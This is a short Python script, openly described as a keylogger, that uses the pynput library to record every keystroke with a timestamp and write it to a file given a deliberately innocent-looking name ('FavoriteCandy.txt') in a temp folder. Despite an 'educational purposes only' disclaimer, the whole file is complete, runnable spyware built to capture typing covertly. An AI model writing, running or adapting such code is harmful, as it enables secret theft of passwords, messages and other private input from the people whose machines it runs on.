#This is a keylogger program to log keystrokes and save them to a file
#This program is for educational purposes only
#I am not responsible for any misuse of this program

import pynput
from pynput.keyboard import Key, Listener
import logging

#Not suspicous name
log_dir = "C:\Temp\FavoriteCandy.txt"

#logging format
logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
